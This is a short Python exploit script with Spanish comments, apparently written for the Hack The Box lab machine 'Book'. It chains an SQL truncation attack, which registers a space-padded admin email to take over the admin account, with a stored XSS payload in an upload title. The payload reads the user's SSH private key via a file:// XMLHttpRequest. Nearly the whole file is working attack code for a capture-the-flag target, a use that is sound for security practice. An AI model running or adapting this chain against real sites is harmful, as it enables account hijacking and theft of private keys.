``` python

#!/usr/bin/python3

## Script que hace uso de la vulnerabilidad SQL Truncation sobre un panel de registro.
## Debemos conocer el elemento vulnerable a SQLi, en este caso el valor del email, que es el que valida la aplicación.

import time
import pdb
import signal

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT,def_handler)

register_url = "http://10.10.10.176/index.php"
collections_url = "http://10.10.10.176/collections.php"

def registerUser():

    register_post = {
        'name': 'S4vitar',
        'email': 'admin@book.htb              A',
        'password': 'pwned'
    }

    # SQL Truncation Attack
    r = requests.post(register_url, data=register_post)

def uploadFile():

    s = requests.session()

    login_data = {
        'email': 'admin@book.htb',
        'password': 'pwned'

    }

    r = s.post(register_url, data=login_data)

    upload_data = {
        'title': '<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>',
        'author': 'prueba',
        'Upload': 'Upload'
    }

    file_to_upload = {'Upload': ('test.txt', 'Hola probando')}

    r = s.post(collections_url, data=upload_data, files=file_to_upload)

if __name__ == '__main__':

    p1 = log.progress("Phase 1")
    p1.status("Registering user admin@book.htb")
    time.sleep(2)

    registerUser()

    p1.success("User admin registered successfully")

    p2 = log.progress("Phase 2")
    p2.status("Uploading file")
    time.sleep(2)

    uploadFile()

    p2.success("File uploaded successfully")

```
